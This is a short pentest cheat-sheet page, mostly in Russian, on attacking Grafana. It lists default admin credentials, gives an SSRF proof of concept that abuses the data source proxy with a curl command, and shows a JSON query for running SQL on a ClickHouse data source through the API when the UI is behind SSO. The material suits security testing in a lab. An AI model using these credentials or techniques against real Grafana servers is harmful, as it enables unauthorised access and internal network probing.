# Grafana

### Default Creds

`admin:admin`

`admin:prom-operator`

`admin:openbmp`

### SSRF

Присутствует возможность создать свой data source и обращаться к любому ресурсу по http/tcp, который был указан в качестве источника и получать ответ

**PoC:**

1. Развернем тестовую среду из 2 контейнеров: Grafana и Nginx.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

2. создадим data source и выберем тип Prometheus, потому что он отправляет запросы по http. В качестве источника выберем nginx

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

3. Отправим запрос к api grafana `/api/datasources`, чтобы получить id нашего data soruce

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

4. с помощью `curl -u admin:admin -s http://10.172.1.22:3000/api/datasources/proxy/4` отправим запрос на установленный ресурс и получим ответ

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Мы можем отправлять запросы от лица grafana к любым ресурсам и по любым протоколам, в зависимости от datasources, которые мы найдем



### Send requests to grafana-clickhouse-datasource via api

If Grafana's ui is behind SSO unlike api

```json
{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "grafana-clickhouse-datasource",
        "uid": "ce4qblsezmupsf"
      },
      "editorType": "sql",
      "queryType": "table",
      "rawSql": "SELECT * FROM system.databases",
      "format": 1,
      "meta": {
        "builderOptions": {
          "database": "",
          "table": "",
          "queryType": "table",
          "columns": [],
          "mode": "list",
          "limit": 1000
        },
        "timezone": "Europe/Moscow"
      },
      "pluginVersion": "4.5.0",
      "datasourceId": 8
    }
  ]
}
```
